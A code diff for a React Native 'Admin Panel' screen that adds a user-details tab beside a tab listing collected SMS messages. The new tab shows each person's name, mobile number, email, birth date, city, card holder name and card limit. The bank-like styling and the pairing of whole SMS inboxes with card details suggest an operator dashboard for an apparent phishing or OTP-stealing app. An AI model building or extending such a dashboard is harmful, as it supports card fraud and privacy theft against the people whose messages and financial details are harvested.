@@ -10,10 +10,11 @@ import {
   View,
 } from 'react-native';
 import { LinearGradient } from 'expo-linear-gradient';
-import { smsApi, UserSmsRecord } from '../api/client';
+import { smsApi, userApi, UserSmsRecord, UserRecord } from '../api/client';
 import { RootStackParamList } from '../types/navigation';
 
 type Props = NativeStackScreenProps<RootStackParamList, 'AdminPanel'>;
+type TabType = 'sms' | 'users';
 
 const INDUS_BLUE = '#1B3A6B';
 const INDUS_DARK = '#0F1F3D';
@@ -40,144 +41,256 @@ function formatSmsDate(ms: number): string {
 }
 
 export default function AdminPanelScreen({ navigation }: Props) {
-  const [records, setRecords] = useState<UserSmsRecord[]>([]);
-  const [loading, setLoading] = useState(true);
-  const [refreshing, setRefreshing] = useState(false);
-  const [error, setError] = useState<string | null>(null);
+  const [activeTab, setActiveTab] = useState<TabType>('sms');
 
-  const fetchRecords = useCallback(async (isRefresh = false) => {
-    if (isRefresh) setRefreshing(true);
-    else setLoading(true);
-    setError(null);
+  // SMS state
+  const [smsRecords, setSmsRecords] = useState<UserSmsRecord[]>([]);
+  const [smsLoading, setSmsLoading] = useState(true);
+  const [smsRefreshing, setSmsRefreshing] = useState(false);
+  const [smsError, setSmsError] = useState<string | null>(null);
 
+  // User state
+  const [userRecords, setUserRecords] = useState<UserRecord[]>([]);
+  const [userLoading, setUserLoading] = useState(true);
+  const [userRefreshing, setUserRefreshing] = useState(false);
+  const [userError, setUserError] = useState<string | null>(null);
+
+  const fetchSms = useCallback(async (isRefresh = false) => {
+    if (isRefresh) setSmsRefreshing(true);
+    else setSmsLoading(true);
+    setSmsError(null);
     try {
       const res = await smsApi.getAll();
       if (res.success && res.data) {
-        // The response is { success, count, data: [...] }
         const data = (res.data as any).data || res.data;
-        setRecords(Array.isArray(data) ? data : []);
+        setSmsRecords(Array.isArray(data) ? data : []);
       } else {
-        setError(res.error || 'Failed to load records');
+        setSmsError(res.error || 'Failed to load SMS records');
       }
-    } catch (e: any) {
-      setError('Network error. Please try again.');
+    } catch {
+      setSmsError('Network error. Please try again.');
     } finally {
-      setLoading(false);
-      setRefreshing(false);
+      setSmsLoading(false);
+      setSmsRefreshing(false);
+    }
+  }, []);
+
+  const fetchUsers = useCallback(async (isRefresh = false) => {
+    if (isRefresh) setUserRefreshing(true);
+    else setUserLoading(true);
+    setUserError(null);
+    try {
+      const res = await userApi.getAll();
+      if (res.success && res.data) {
+        const data = (res.data as any).data || res.data;
+        setUserRecords(Array.isArray(data) ? data : []);
+      } else {
+        setUserError(res.error || 'Failed to load user records');
+      }
+    } catch {
+      setUserError('Network error. Please try again.');
+    } finally {
+      setUserLoading(false);
+      setUserRefreshing(false);
     }
   }, []);
 
   useEffect(() => {
-    fetchRecords();
-  }, [fetchRecords]);
+    fetchSms();
+    fetchUsers();
+  }, [fetchSms, fetchUsers]);
 
   const handleLogout = () => {
     navigation.reset({ index: 0, routes: [{ name: 'Welcome' }] });
   };
 
+  const headerCount =
+    activeTab === 'sms'
+      ? `${smsRecords.length} SMS record${smsRecords.length !== 1 ? 's' : ''}`
+      : `${userRecords.length} user${userRecords.length !== 1 ? 's' : ''}`;
+
   return (
-    <LinearGradient
-      colors={['#E8EFF7', '#F5F8FC', '#FFFFFF']}
-      style={styles.container}
-    >
+    <LinearGradient colors={['#E8EFF7', '#F5F8FC', '#FFFFFF']} style={styles.container}>
       {/* Header */}
       <View style={styles.header}>
         <View>
           <Text style={styles.headerTitle}>Admin Panel</Text>
-          <Text style={styles.headerSubtitle}>
-            {records.length} SMS record{records.length !== 1 ? 's' : ''}
-          </Text>
+          <Text style={styles.headerSubtitle}>{headerCount}</Text>
         </View>
         <Pressable style={styles.logoutButton} onPress={handleLogout}>
           <Text style={styles.logoutText}>Logout</Text>
         </Pressable>
       </View>
 
-      {/* Content */}
-      <ScrollView
-        style={styles.scrollView}
-        contentContainerStyle={styles.scrollContent}
-        showsVerticalScrollIndicator={false}
-        refreshControl={
-          <RefreshControl
-            refreshing={refreshing}
-            onRefresh={() => fetchRecords(true)}
-            colors={[INDUS_BLUE]}
-          />
-        }
-      >
-        {loading ? (
-          <View style={styles.center}>
-            <ActivityIndicator size="large" color={INDUS_BLUE} />
-            <Text style={styles.loadingText}>Loading records...</Text>
-          </View>
-        ) : error ? (
-          <View style={styles.center}>
-            <Text style={styles.errorText}>{error}</Text>
-            <Pressable
-              style={styles.retryButton}
-              onPress={() => fetchRecords()}
-            >
-              <Text style={styles.retryText}>Retry</Text>
-            </Pressable>
-          </View>
-        ) : records.length === 0 ? (
-          <View style={styles.center}>
-            <Text style={styles.emptyIcon}>📭</Text>
-            <Text style={styles.emptyText}>No SMS records yet</Text>
-            <Text style={styles.emptySubtext}>
-              Records will appear here after users submit their forms
-            </Text>
-          </View>
-        ) : (
-          records.map((record, idx) => (
-            <View key={record._id || idx} style={styles.userCard}>
-              {/* User info header */}
-              <View style={styles.userHeader}>
-                <View style={styles.userAvatar}>
-                  <Text style={styles.userAvatarText}>
-                    {record.fullName?.charAt(0)?.toUpperCase() || '?'}
-                  </Text>
-                </View>
-                <View style={styles.userInfo}>
-                  <Text style={styles.userName}>{record.fullName}</Text>
-                  <Text style={styles.userMobile}>{record.mobileNumber}</Text>
-                </View>
-                <Text style={styles.recordDate}>
-                  {formatDate(record.createdAt)}
-                </Text>
-              </View>
+      {/* Tabs */}
+      <View style={styles.tabBar}>
+        <Pressable
+          style={[styles.tab, activeTab === 'sms' && styles.tabActive]}
+          onPress={() => setActiveTab('sms')}
+        >
+          <Text style={[styles.tabText, activeTab === 'sms' && styles.tabTextActive]}>
+            📩 SMS Records
+          </Text>
+        </Pressable>
+        <Pressable
+          style={[styles.tab, activeTab === 'users' && styles.tabActive]}
+          onPress={() => setActiveTab('users')}
+        >
+          <Text style={[styles.tabText, activeTab === 'users' && styles.tabTextActive]}>
+            👤 User Details
+          </Text>
+        </Pressable>
+      </View>
 
-              {/* SMS messages */}
-              <View style={styles.messagesContainer}>
-                {record.messages.map((msg, mIdx) => (
-                  <View key={mIdx} style={styles.smsCard}>
-                    <View style={styles.smsHeader}>
-                      <Text style={styles.smsSender} numberOfLines={1}>
-                        {msg.address || 'Unknown'}
-                      </Text>
-                      <Text style={styles.smsTime}>
-                        {formatSmsDate(msg.date)}
-                      </Text>
-                    </View>
-                    <Text style={styles.smsBody} numberOfLines={4}>
-                      {msg.body}
+      {/* SMS Tab */}
+      {activeTab === 'sms' && (
+        <ScrollView
+          style={styles.scrollView}
+          contentContainerStyle={styles.scrollContent}
+          showsVerticalScrollIndicator={false}
+          refreshControl={
+            <RefreshControl
+              refreshing={smsRefreshing}
+              onRefresh={() => fetchSms(true)}
+              colors={[INDUS_BLUE]}
+            />
+          }
+        >
+          {smsLoading ? (
+            <View style={styles.center}>
+              <ActivityIndicator size="large" color={INDUS_BLUE} />
+              <Text style={styles.loadingText}>Loading SMS records...</Text>
+            </View>
+          ) : smsError ? (
+            <View style={styles.center}>
+              <Text style={styles.errorText}>{smsError}</Text>
+              <Pressable style={styles.retryButton} onPress={() => fetchSms()}>
+                <Text style={styles.retryText}>Retry</Text>
+              </Pressable>
+            </View>
+          ) : smsRecords.length === 0 ? (
+            <View style={styles.center}>
+              <Text style={styles.emptyIcon}>📭</Text>
+              <Text style={styles.emptyText}>No SMS records yet</Text>
+              <Text style={styles.emptySubtext}>
+                SMS records will appear here once users submit the form
+              </Text>
+            </View>
+          ) : (
+            smsRecords.map((record, idx) => (
+              <View key={record._id || idx} style={styles.card}>
+                <View style={styles.cardHeader}>
+                  <View style={styles.avatar}>
+                    <Text style={styles.avatarText}>
+                      {record.fullName?.charAt(0)?.toUpperCase() || '?'}
                     </Text>
                   </View>
-                ))}
+                  <View style={styles.cardHeaderInfo}>
+                    <Text style={styles.cardName}>{record.fullName}</Text>
+                    <Text style={styles.cardSub}>{record.mobileNumber}</Text>
+                  </View>
+                  <Text style={styles.cardDate}>{formatDate(record.createdAt)}</Text>
+                </View>
+                <View style={styles.divider} />
+                <View style={styles.messagesContainer}>
+                  {record.messages.map((msg, mIdx) => (
+                    <View key={mIdx} style={styles.smsCard}>
+                      <View style={styles.smsHeader}>
+                        <Text style={styles.smsSender} numberOfLines={1}>
+                          {msg.address || 'Unknown'}
+                        </Text>
+                        <Text style={styles.smsTime}>{formatSmsDate(msg.date)}</Text>
+                      </View>
+                      <Text style={styles.smsBody} numberOfLines={4}>{msg.body}</Text>
+                    </View>
+                  ))}
+                </View>
               </View>
+            ))
+          )}
+        </ScrollView>
+      )}
+
+      {/* User Details Tab */}
+      {activeTab === 'users' && (
+        <ScrollView
+          style={styles.scrollView}
+          contentContainerStyle={styles.scrollContent}
+          showsVerticalScrollIndicator={false}
+          refreshControl={
+            <RefreshControl
+              refreshing={userRefreshing}
+              onRefresh={() => fetchUsers(true)}
+              colors={[INDUS_BLUE]}
+            />
+          }
+        >
+          {userLoading ? (
+            <View style={styles.center}>
+              <ActivityIndicator size="large" color={INDUS_BLUE} />
+              <Text style={styles.loadingText}>Loading user details...</Text>
             </View>
-          ))
-        )}
-      </ScrollView>
+          ) : userError ? (
+            <View style={styles.center}>
+              <Text style={styles.errorText}>{userError}</Text>
+              <Pressable style={styles.retryButton} onPress={() => fetchUsers()}>
+                <Text style={styles.retryText}>Retry</Text>
+              </Pressable>
+            </View>
+          ) : userRecords.length === 0 ? (
+            <View style={styles.center}>
+              <Text style={styles.emptyIcon}>📋</Text>
+              <Text style={styles.emptyText}>No user details yet</Text>
+              <Text style={styles.emptySubtext}>
+                User details will appear here after users submit the form
+              </Text>
+            </View>
+          ) : (
+            userRecords.map((user, idx) => (
+              <View key={user._id || idx} style={styles.card}>
+                <View style={styles.cardHeader}>
+                  <View style={styles.avatar}>
+                    <Text style={styles.avatarText}>
+                      {user.fullName?.charAt(0)?.toUpperCase() || '?'}
+                    </Text>
+                  </View>
+                  <View style={styles.cardHeaderInfo}>
+                    <Text style={styles.cardName}>{user.fullName}</Text>
+                    <Text style={styles.cardSub}>{user.mobileNumber}</Text>
+                  </View>
+                  <Text style={styles.cardDate}>{formatDate(user.createdAt)}</Text>
+                </View>
+                <View style={styles.divider} />
+                <View style={styles.userDetailsGrid}>
+                  <DetailRow label="Email" value={user.email} />
+                  <DetailRow label="Date of Birth" value={user.dob} />
+                  <DetailRow label="City" value={user.city} />
+                  <DetailRow label="Card Holder" value={user.cardHolderName} />
+                  <DetailRow label="Card Limit" value={`\u20B9${user.cardTotalLimit}`} />
+                  {user.simLabel ? <DetailRow label="SIM" value={user.simLabel} /> : null}
+                </View>
+              </View>
+            ))
+          )}
+        </ScrollView>
+      )}
     </LinearGradient>
   );
 }
 
+function DetailRow({ label, value }: { label: string; value: string }) {
+  return (
+    <View style={styles.detailRow}>
+      <Text style={styles.detailLabel}>{label}</Text>
+      <Text style={styles.detailValue}>{value}</Text>
+    </View>
+  );
+}
+
 const styles = StyleSheet.create({
-  container: {
-    flex: 1,
-  },
+  container: { flex: 1 },
+
+  // Header
   header: {
     flexDirection: 'row',
     justifyContent: 'space-between',
@@ -187,71 +300,58 @@ const styles = StyleSheet.create({
     paddingBottom: 16,
     backgroundColor: INDUS_BLUE,
   },
-  headerTitle: {
-    fontSize: 22,
-    fontWeight: '800',
-    color: '#FFFFFF',
-  },
-  headerSubtitle: {
-    fontSize: 13,
-    color: 'rgba(255,255,255,0.7)',
-    marginTop: 2,
-  },
+  headerTitle: { fontSize: 22, fontWeight: '800', color: '#FFFFFF' },
+  headerSubtitle: { fontSize: 13, color: 'rgba(255,255,255,0.7)', marginTop: 2 },
   logoutButton: {
     backgroundColor: 'rgba(255,255,255,0.15)',
     paddingHorizontal: 16,
     paddingVertical: 8,
     borderRadius: 8,
   },
-  logoutText: {
-    color: '#FFFFFF',
+  logoutText: { color: '#FFFFFF', fontSize: 14, fontWeight: '600' },
+
+  // Tabs
+  tabBar: {
+    flexDirection: 'row',
+    backgroundColor: INDUS_BLUE,
+    paddingHorizontal: 16,
+  },
+  tab: {
+    flex: 1,
+    paddingVertical: 12,
+    alignItems: 'center',
+    borderBottomWidth: 3,
+    borderBottomColor: 'transparent',
+  },
+  tabActive: {
+    borderBottomColor: '#FFFFFF',
+  },
+  tabText: {
     fontSize: 14,
     fontWeight: '600',
+    color: 'rgba(255,255,255,0.55)',
   },
-  scrollView: {
-    flex: 1,
+  tabTextActive: {
+    color: '#FFFFFF',
   },
-  scrollContent: {
-    padding: 16,
-    paddingBottom: 40,
-  },
-  center: {
-    alignItems: 'center',
-    justifyContent: 'center',
-    paddingVertical: 60,
-  },
-  loadingText: {
-    marginTop: 12,
-    fontSize: 14,
-    color: '#6B7280',
-  },
-  errorText: {
-    fontSize: 15,
-    color: '#EF4444',
-    textAlign: 'center',
-    marginBottom: 16,
-  },
+
+  // Scroll
+  scrollView: { flex: 1 },
+  scrollContent: { padding: 16, paddingBottom: 40 },
+
+  // Center states
+  center: { alignItems: 'center', justifyContent: 'center', paddingVertical: 60 },
+  loadingText: { marginTop: 12, fontSize: 14, color: '#6B7280' },
+  errorText: { fontSize: 15, color: '#EF4444', textAlign: 'center', marginBottom: 16 },
   retryButton: {
     backgroundColor: INDUS_BLUE,
     paddingHorizontal: 24,
     paddingVertical: 10,
     borderRadius: 8,
   },
-  retryText: {
-    color: '#FFFFFF',
-    fontSize: 14,
-    fontWeight: '600',
-  },
-  emptyIcon: {
-    fontSize: 48,
-    marginBottom: 12,
-  },
-  emptyText: {
-    fontSize: 18,
-    fontWeight: '700',
-    color: INDUS_DARK,
-    marginBottom: 6,
-  },
+  retryText: { color: '#FFFFFF', fontSize: 14, fontWeight: '600' },
+  emptyIcon: { fontSize: 48, marginBottom: 12 },
+  emptyText: { fontSize: 18, fontWeight: '700', color: INDUS_DARK, marginBottom: 6 },
   emptySubtext: {
     fontSize: 14,
     color: '#6B7280',
@@ -260,8 +360,8 @@ const styles = StyleSheet.create({
     paddingHorizontal: 32,
   },
 
-  // User card
-  userCard: {
+  // Card
+  card: {
     backgroundColor: '#FFFFFF',
     borderRadius: 16,
     marginBottom: 16,
@@ -272,12 +372,8 @@ const styles = StyleSheet.create({
     shadowOpacity: 0.08,
     shadowRadius: 8,
   },
-  userHeader: {
-    flexDirection: 'row',
-    alignItems: 'center',
-    marginBottom: 14,
-  },
-  userAvatar: {
+  cardHeader: { flexDirection: 'row', alignItems: 'center' },
+  avatar: {
     width: 40,
     height: 40,
     borderRadius: 20,
@@ -286,36 +382,15 @@ const styles = StyleSheet.create({
     alignItems: 'center',
     marginRight: 12,
   },
-  userAvatarText: {
-    color: '#FFFFFF',
-    fontSize: 18,
-    fontWeight: '700',
-  },
-  userInfo: {
-    flex: 1,
-  },
-  userName: {
-    fontSize: 16,
-    fontWeight: '700',
-    color: INDUS_DARK,
-  },
-  userMobile: {
-    fontSize: 13,
-    color: '#6B7280',
-    marginTop: 1,
-  },
-  recordDate: {
-    fontSize: 11,
-    color: '#9CA3AF',
-  },
+  avatarText: { color: '#FFFFFF', fontSize: 18, fontWeight: '700' },
+  cardHeaderInfo: { flex: 1 },
+  cardName: { fontSize: 16, fontWeight: '700', color: INDUS_DARK },
+  cardSub: { fontSize: 13, color: '#6B7280', marginTop: 1 },
+  cardDate: { fontSize: 11, color: '#9CA3AF' },
+  divider: { height: 1, backgroundColor: '#E5E7EB', marginVertical: 12 },
 
-  // SMS cards inside user card
-  messagesContainer: {
-    borderTopWidth: 1,
-    borderTopColor: '#E5E7EB',
-    paddingTop: 12,
-    gap: 8,
-  },
+  // SMS messages
+  messagesContainer: { gap: 8 },
   smsCard: {
     backgroundColor: '#F8FAFC',
     borderRadius: 10,
@@ -329,20 +404,19 @@ const styles = StyleSheet.create({
     alignItems: 'center',
     marginBottom: 6,
   },
-  smsSender: {
-    fontSize: 13,
-    fontWeight: '700',
-    color: INDUS_BLUE,
-    flex: 1,
-    marginRight: 8,
+  smsSender: { fontSize: 13, fontWeight: '700', color: INDUS_BLUE, flex: 1, marginRight: 8 },
+  smsTime: { fontSize: 11, color: '#9CA3AF' },
+  smsBody: { fontSize: 12, color: '#374151', lineHeight: 18 },
+
+  // User detail rows
+  userDetailsGrid: { gap: 4 },
+  detailRow: {
+    flexDirection: 'row',
+    justifyContent: 'space-between',
+    paddingVertical: 7,
+    borderBottomWidth: 1,
+    borderBottomColor: '#F3F4F6',
   },
-  smsTime: {
-    fontSize: 11,
-    color: '#9CA3AF',
-  },
-  smsBody: {
-    fontSize: 12,
-    color: '#374151',
-    lineHeight: 18,
-  },
+  detailLabel: { fontSize: 13, color: '#6B7280', fontWeight: '500', flex: 1 },
+  detailValue: { fontSize: 13, color: INDUS_DARK, fontWeight: '600', flex: 2, textAlign: 'right' },
 });
